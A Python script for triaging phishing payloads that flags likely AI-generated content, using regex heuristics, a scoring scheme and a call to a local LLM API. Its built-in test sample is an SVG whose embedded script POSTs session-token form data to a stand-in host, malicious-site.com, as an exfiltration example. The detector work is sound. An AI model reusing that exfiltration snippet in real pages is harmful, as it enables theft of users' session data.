#!/usr/bin/env python3
"""
AI-Generated Phishing Detection Triage Script
"""

import os
import sys
import json
import requests
import re
from typing import Dict, List, Tuple, Optional

# Configuration
LLM_URL = os.environ.get('LLM_URL', 'http://127.0.0.1:8080/v1')
USE_AI = True  # Set to False to test without AI

def analyze_payload_content(content: str) -> Dict[str, any]:
    """
    Analyze payload content for AI-generated characteristics
    """
    results = {
        'is_ai_generated': False,
        'synthetic_artifacts': [],
        'complexity_score': 0,
        'verbose_naming': False,
        'redundant_logic': False,
        'unnatural_encoding': False
    }
    
    # Check for verbose naming patterns (common in AI code)
    verbose_patterns = [
        r'function_[a-zA-Z0-9_]{10,}',
        r'var_[a-zA-Z0-9_]{10,}',
        r'object_[a-zA-Z0-9_]{10,}'
    ]
    
    for pattern in verbose_patterns:
        if re.search(pattern, content):
            results['verbose_naming'] = True
            results['synthetic_artifacts'].append('verbose_naming')
    
    # Check for redundant logic patterns
    redundant_patterns = [
        r'if \(true\) \{[^}]*\}',
        r'do \{\s*\}\s+while \(false\)',
        r'\bfor \(int i = 0; i < 1000; i++\)'
    ]
    
    for pattern in redundant_patterns:
        if re.search(pattern, content, re.DOTALL):
            results['redundant_logic'] = True
            results['synthetic_artifacts'].append('redundant_logic')
    
    # Check for unnatural encoding (common in AI obfuscation)
    encoding_patterns = [
        r'&#x[0-9a-fA-F]{2,};',
        r'\\u[0-9a-fA-F]{4}',
        r'base64.*?={2,}'
    ]
    
    for pattern in encoding_patterns:
        if re.search(pattern, content):
            results['unnatural_encoding'] = True
            results['synthetic_artifacts'].append('unnatural_encoding')
    
    # Complexity scoring (simplified)
    lines = content.split('\n')
    avg_line_length = sum(len(line) for line in lines) / len(lines) if lines else 0
    
    if avg_line_length > 150:
        results['complexity_score'] += 1
        results['synthetic_artifacts'].append('excessive_length')
    
    # If we have multiple synthetic artifacts, flag as potentially AI-generated
    if len(results['synthetic_artifacts']) >= 2:
        results['is_ai_generated'] = True
    
    return results

def call_llm_api(prompt: str) -> Optional[str]:
    """
    Call the LLM API for AI analysis
    """
    try:
        response = requests.post(
            f"{LLM_URL}/chat/completions",
            json={
                "model": "gpt-4",
                "messages": [
                    {"role": "system", "content": "You are a security analyst specializing in detecting AI-generated phishing content. Analyze the provided payload and determine if it shows characteristics of AI generation."},
                    {"role": "user", "content": prompt}
                ],
                "temperature": 0.3
            },
            timeout=10
        )
        response.raise_for_status()
        return response.json()['choices'][0]['message']['content']
    except Exception as e:
        print(f"Warning: AI analysis failed: {e}")
        return None

def analyze_with_ai(payload_content: str, filename: str = "unknown") -> Dict[str, any]:
    """
    Use AI to analyze payload content for AI generation indicators
    """
    if not USE_AI:
        return {"ai_analysis": "AI disabled", "confidence": 0.0}
    
    prompt = f"""
    Analyze the following phishing payload for signs of AI generation:

    Payload Content:
    {payload_content}

    Filename: {filename}

    Return only a JSON object with these fields:
    {{
        "is_ai_generated": boolean,
        "confidence": number (0.0-1.0),
        "reasoning": string
    }}
    """
    
    try:
        result = call_llm_api(prompt)
        if result:
            # Extract JSON from response (in case of markdown formatting)
            json_start = result.find('{')
            json_end = result.rfind('}') + 1
            if json_start != -1 and json_end != -1:
                json_str = result[json_start:json_end]
                return json.loads(json_str)
    except Exception as e:
        print(f"Error in AI analysis: {e}")
    
    # Fallback for AI failure
    return {"ai_analysis": "AI unavailable", "confidence": 0.0}

def triage_email(email_content: str, filename: str = "unknown") -> Dict[str, any]:
    """
    Main triage function for phishing email analysis
    """
    # Extract payload content (simplified - in reality would parse email structure)
    payload_content = extract_payload_content(email_content)
    
    # Rule-based analysis
    rule_results = analyze_payload_content(payload_content)
    
    # AI analysis (if available)
    ai_results = analyze_with_ai(payload_content, filename)
    
    # Combine results
    final_result = {
        "filename": filename,
        "rule_based_analysis": rule_results,
        "ai_analysis": ai_results,
        "overall_assessment": "low",
        "confidence": 0.0
    }
    
    # Simple scoring logic
    score = 0
    
    # Add points for rule-based indicators
    if rule_results['is_ai_generated']:
        score += 3
    if rule_results['verbose_naming']:
        score += 1
    if rule_results['redundant_logic']:
        score += 2
    if rule_results['unnatural_encoding']:
        score += 2
    
    # Add points for AI confidence
    if ai_results.get('confidence', 0) > 0.7:
        score += 3
    elif ai_results.get('confidence', 0) > 0.5:
        score += 1
    
    # Determine risk level
    if score >= 5:
        final_result['overall_assessment'] = 'high'
        final_result['confidence'] = min(1.0, score / 6.0)
    elif score >= 3:
        final_result['overall_assessment'] = 'medium'
        final_result['confidence'] = min(1.0, score / 6.0)
    else:
        final_result['overall_assessment'] = 'low'
        final_result['confidence'] = min(1.0, score / 6.0)
    
    return final_result

def extract_payload_content(email_content: str) -> str:
    """
    Extract payload content from email (simplified version)
    """
    # In a real implementation, this would parse the actual email structure
    # For testing purposes, we'll return a sample content
    if "AI-generated" in email_content:
        return """<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script><![CDATA[
    function generateRandomString() {
      var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      var result = '';
      for (var i = 0; i < 50; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    }
    
    function processFormSubmission() {
      var formData = new FormData();
      formData.append('user_id', generateRandomString());
      formData.append('session_token', generateRandomString());
      fetch('https://malicious-site.com/collect', { method: 'POST', body: formData });
    }
  ]]></script>
</svg>"""
    else:
        return """<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect x="10" y="10" width="80" height="80" fill="red"/>
</svg>"""

# Test function
def main():
    if len(sys.argv) > 1:
        filename = sys.argv[1]
        with open(filename, 'r') as f:
            content = f.read()
        result = triage_email(content, filename)
        print(json.dumps(result, indent=2))
    else:
        # Test with sample inputs
        test_cases = [
            ("AI-generated phishing", "Sample AI-generated payload with verbose naming and redundant logic"),
            ("Normal phishing", "Simple SVG file with minimal code")
        ]
        
        for name, content in test_cases:
            result = triage_email(content, name)
            print(f"\n--- {name} ---")
            print(json.dumps(result, indent=2))

if __name__ == "__main__":
    main()